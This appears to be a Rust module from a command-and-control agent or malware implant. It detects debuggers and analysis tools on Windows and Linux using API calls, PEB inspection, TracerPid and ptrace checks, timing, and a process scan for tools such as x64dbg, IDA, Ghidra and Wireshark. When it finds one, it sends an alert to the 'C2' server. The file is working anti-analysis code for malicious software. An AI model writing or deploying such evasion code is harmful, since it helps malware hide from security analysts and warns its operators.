use std::{
    process,
    time::{Duration, Instant},
};
use sysinfo::{ProcessesToUpdate, System};

pub fn debug_log(message: &str) {
    println!("[ANTI-DEBUG] {}", message);
}

#[cfg(target_os = "windows")]
mod windows {
    use super::debug_log;
    use winapi::um::{
        debugapi::{CheckRemoteDebuggerPresent, IsDebuggerPresent},
        processthreadsapi,
    };

    pub fn is_debugger_present() -> bool {
        let result = unsafe { IsDebuggerPresent() != 0 };
        debug_log(&format!("Windows::IsDebuggerPresent() = {}", result));
        result
    }

    pub fn check_remote_debugger() -> bool {
        let mut debugger_present = 0;
        unsafe {
            CheckRemoteDebuggerPresent(
                processthreadsapi::GetCurrentProcess(),
                &mut debugger_present,
            );
        }
        debug_log(&format!(
            "Windows::CheckRemoteDebuggerPresent() = {}",
            debugger_present
        ));
        debugger_present != 0
    }

    pub fn detect_debugger_via_peb() -> bool {
        use ntapi::ntpsapi::NtQueryInformationProcess;
        use ntapi::ntpsapi::ProcessBasicInformation;
        use ntapi::ntpsapi::PROCESS_BASIC_INFORMATION;
        use std::mem::{size_of, zeroed};
        use winapi::um::processthreadsapi::GetCurrentProcess;

        unsafe {
            let mut pbi: PROCESS_BASIC_INFORMATION = zeroed();
            let mut return_length = 0;
            let status = NtQueryInformationProcess(
                GetCurrentProcess(),
                ProcessBasicInformation,
                &mut pbi as *mut _ as *mut _,
                size_of::<PROCESS_BASIC_INFORMATION>() as u32,
                &mut return_length,
            );
            if status < 0 {
                debug_log("Windows::NtQueryInformationProcess failed");
                return false;
            }
            // PEB is at pbi.PebBaseAddress
            #[repr(C)]
            struct PEB {
                _pad: [u8; 2],
                being_debugged: u8,
                _pad2: [u8; 1],
            }
            let peb_ptr = pbi.PebBaseAddress as *const PEB;
            let result = if !peb_ptr.is_null() {
                (*peb_ptr).being_debugged != 0
            } else {
                false
            };
            debug_log(&format!("Windows::PEB::being_debugged = {}", result));
            result
        }
    }
}

#[cfg(target_os = "linux")]
mod linux {
    use super::debug_log;
    use libc;
    use std::env;

    pub fn is_traced() -> bool {
        if let Ok(status) = std::fs::read_to_string("/proc/self/status") {
            for line in status.lines() {
                if line.starts_with("TracerPid:") {
                    let pid = line.split_whitespace().nth(1).unwrap_or("0");
                    let result = pid != "0";
                    debug_log(&format!("Linux::TracerPid = {} -> {}", pid, result));
                    return result;
                }
            }
        }
        false
    }

    pub fn ptrace_self() -> bool {
        let result = unsafe { libc::ptrace(libc::PTRACE_TRACEME, 0, 0, 0) == -1 };
        debug_log(&format!("Linux::ptrace(PTRACE_TRACEME) = {}", result));
        result
    }

    pub fn detect_debug_env() -> bool {
        let result = env::var("LD_PRELOAD").is_ok()
            || env::var("GDB").is_ok()
            || env::var("INSIDE_EMACS").is_ok();

        debug_log(&format!("Linux::DebugEnvVars = {}", result));
        result
    }
}

pub fn detect_debugging() -> bool {
    let os_name = if cfg!(target_os = "windows") {
        "Windows"
    } else if cfg!(target_os = "linux") {
        "Linux"
    } else {
        "Unknown OS"
    };
    debug_log(&format!("Démarrage détection sur {}", os_name));

    debug_log("Vérification temporelle...");
    if detect_by_timing() {
        debug_log("Détection par timing positive!");
        return true;
    }

    debug_log("Recherche de processus de débogage...");
    if detect_debugger_processes() {
        debug_log("Processus de débogage détecté!");
        return true;
    }

    #[cfg(target_os = "windows")]
    {
        debug_log("Vérification des méthodes Windows...");
        return windows::is_debugger_present()
            || windows::check_remote_debugger()
            || windows::detect_debugger_via_peb();
    }

    #[cfg(target_os = "linux")]
    {
        debug_log("Vérification des méthodes Linux...");
        return linux::is_traced() || linux::ptrace_self() || linux::detect_debug_env();
    }
}

fn detect_by_timing() -> bool {
    let start = Instant::now();

    let mut x: usize = 0;
    for i in 0..10_000_000 {
        x = x.wrapping_add(i);
    }

    std::hint::black_box(x);

    let elapsed = start.elapsed();
    let result = elapsed > Duration::from_millis(250);

    debug_log(&format!(
        "Détection temporelle: {}ms > 250ms? {}",
        elapsed.as_millis(),
        result
    ));
    result
}

fn detect_debugger_processes() -> bool {
    let mut system = System::new();
    system.refresh_processes(ProcessesToUpdate::All, true);

    let dangerous_processes = [
        "ollydbg",
        "x64dbg",
        "x32dbg",
        "ida",
        "ida64",
        "windbg",
        "procmon",
        "processhacker",
        "wireshark",
        "immunitydebugger",
        "gdb",
        "lldb",
        "strace",
        "ltrace",
        "radare2",
        "edb",
        "hopper",
        "idaq",
        "valgrind",
        "ghidra",
    ];

    let mut detected = false;

    debug_log("Scan des processus en cours...");
    for (_, process) in system.processes() {
        if let Some(name) = process.name().to_str() {
            let name_lower = name.to_lowercase();
            if dangerous_processes.iter().any(|&p| name_lower.contains(p)) {
                debug_log(&format!("Processus suspect détecté: {}", name));
                detected = true;
            }
        }
    }

    debug_log(&format!("Résultat scan processus: {}", detected));
    detected
}

#[allow(dead_code)]
pub fn anti_debug_response() {
    debug_log("Lancement de la vérification anti-débogage");

    if detect_debugging() {
        debug_log("Débogueur détecté! (mais le programme continue)");
        // Envoi d'une alerte au C2
        tokio::spawn(async {
            let _ = crate::connexion::send_anti_debug_alert().await;
        });
    } else {
        debug_log("Aucun débogueur détecté");
    }
}
